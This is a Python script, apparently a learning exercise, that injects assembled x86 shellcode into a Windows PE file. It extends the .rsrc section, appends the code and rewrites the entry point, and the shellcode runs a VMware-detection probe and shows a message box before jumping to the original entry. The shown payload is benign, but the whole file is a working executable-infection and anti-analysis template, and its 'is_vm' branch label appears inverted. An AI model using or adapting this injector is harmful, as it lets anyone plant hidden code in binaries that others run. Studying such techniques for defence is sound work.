import pefile
from keystone import *
import sys

# Function to add padding to a given size to make it a multiple of 16
def addPadding_bytes(size):
    remainder = size % 16
    if (remainder != 0):
        size = size + 16 - remainder
    return size

# Function to extend a byte array to a given size with null bytes
def extend_bytes(size, b):
    return b + (size - len(b))* b'\x00'

# Function to convert a string to a wide string (UTF-16) and prepend its length
def to_wstring(tosend):
    snd_data = bytes([(len(tosend) >> 8), (len(tosend) & 0xff)])
    snd_data += tosend.encode('utf-16-be')
    return snd_data[3:]

# Check if the script is run with the correct number of arguments
if len(sys.argv) != 2:
    print("Usage: python inject.py <PE_FILE>")
    sys.exit(1)

# Load the PE file
pe_filename = sys.argv[1]
pe = pefile.PE(pe_filename)
oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
imageBase = pe.OPTIONAL_HEADER.ImageBase

# Function to find the address of an imported function by name
def find_import_address(name):
    for item in pe.DIRECTORY_ENTRY_IMPORT:
        for import_fn in item.imports:
            if import_fn.name == name.encode():
                return import_fn.address
    raise Exception('Function not found')

# Find the address of the MessageBoxW function
MessageBoxWAddress = find_import_address('MessageBoxW')

# Get the last section of the PE file
last_section = pe.sections[-1]
extend_address = last_section.PointerToRawData + last_section.SizeOfRawData

# Define the caption and text for the MessageBox
caption = 'Silas test PE Injection'
text = 'Hello there!'

# Convert the caption and text to wide strings and add padding
caption_unicode = to_wstring(caption)
caption_length = addPadding_bytes(len(caption_unicode))
text_unicode = to_wstring(text)
text_length = addPadding_bytes(len(text_unicode))

# Find the .rsrc section and extend its size
for sect in pe.sections:
    if b".rsrc" in sect.Name:
        rsrc_RA = sect.PointerToRawData
        rsrc_VA = sect.VirtualAddress
        sect.SizeOfRawData += 0x1000
        sect.Misc_VirtualSize += 0x1000
        break

# Calculate offsets and addresses for the shellcode
offset = (extend_address - rsrc_RA + rsrc_VA)
shellcode_length = caption_length + text_length
captionAddress = shellcode_length + offset + imageBase
textAddress = shellcode_length + caption_length + offset + imageBase
oep_offset = oep - offset  

# Define the shellcode to check for VM and display the MessageBox
code = f"""
    mov eax, 0x564D5868
    mov edx, 0x5658
    in  eax, dx
    cmp ebx, 0x564D5868
    jne is_vm

    push 0
    push {captionAddress}
    push {textAddress}
    push 0
    call [{MessageBoxWAddress}]
    jmp {oep_offset}

is_vm:
    jmp {oep_offset}
"""

# Assemble the shellcode using Keystone
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(code)
shellcode = bytes(encoding)
print(shellcode.hex())

# Extend the shellcode, caption, and text to the required lengths
shellcode = extend_bytes(caption_length + text_length, shellcode)
caption = extend_bytes(caption_length, caption_unicode)
text = extend_bytes(text_length, text_unicode)

# Update the PE header with the new entry point and size of the image
pe.OPTIONAL_HEADER.AddressOfEntryPoint = offset
pe.OPTIONAL_HEADER.SizeOfImage += 0x1000

# Write the modified PE file to a new file
new_filename = f'new_{pe_filename}'
pe.write(new_filename)

# Read the new PE file into memory
with open(new_filename, 'rb') as f:
    pebyte = f.read()

# Extend the PE file with the shellcode, caption, and text
new_pebyte = extend_bytes(extend_address, pebyte) + shellcode + caption + text
new_pebyte = extend_bytes(len(pebyte) + 0x1000, new_pebyte)

# Write the final modified PE file back to disk
with open(new_filename, 'wb') as f:
    f.write(new_pebyte)
